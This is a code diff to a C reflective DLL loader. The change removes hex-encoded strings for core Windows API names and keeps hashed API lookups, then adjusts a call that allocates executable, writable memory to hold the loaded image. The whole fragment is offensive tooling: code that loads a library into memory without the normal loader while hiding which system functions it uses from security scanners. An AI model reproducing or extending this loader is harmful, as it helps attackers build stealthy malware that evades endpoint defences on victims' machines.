@@ -153,13 +153,6 @@ void ReflectiveLoader()
         dll_image_address--;
     }
 
-    // 1. resolve system functions
-
-    char KERNEL32_DLL_string[] = {'\x4b', '\x45', '\x52', '\x4e', '\x45', '\x4c', '\x33', '\x32', '\x2e', '\x44', '\x4c', '\x4c', 0};                   // KERNEL32.DLL
-    char VirtualAlloc_string[] = {'\x56', '\x69', '\x72', '\x74', '\x75', '\x61', '\x6c', '\x41', '\x6c', '\x6c', '\x6f', '\x63', 0};                   // VirtualAlloc
-    char GetProcAddress_string[] = {'\x47', '\x65', '\x74', '\x50', '\x72', '\x6f', '\x63', '\x41', '\x64', '\x64', '\x72', '\x65', '\x73', '\x73', 0}; // GetProcAddress
-    char LoadLibraryA_string[] = {'\x4c', '\x6f', '\x61', '\x64', '\x4c', '\x69', '\x62', '\x72', '\x61', '\x72', '\x79', '\x41', 0};                   // LoadLibraryA
-
     HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH);
     LoadLibraryA_t _LoadLibraryA = (LoadLibraryA_t)CustomGetProcAddress(hKernel32dll, LOAD_LIBRARY_HASH);
     GetProcAddress_t _GetProcAddress = (GetProcAddress_t)CustomGetProcAddress(hKernel32dll, GET_PROC_ADDRESS_HASH);
@@ -167,7 +160,7 @@ void ReflectiveLoader()
 
     // 2. allocate memory for loading dll
 
-    DWORD64 dll_base = (DWORD64)_AllocVirtMem((HANDLE)-1, NULL, nt_headers_address->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    DWORD64 dll_base = (DWORD64)_AllocVirtMem(NULL, nt_headers_address->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     // 3. copy headers
     copy_memory(dll_base, dll_image_address, nt_headers_address->OptionalHeader.SizeOfHeaders);
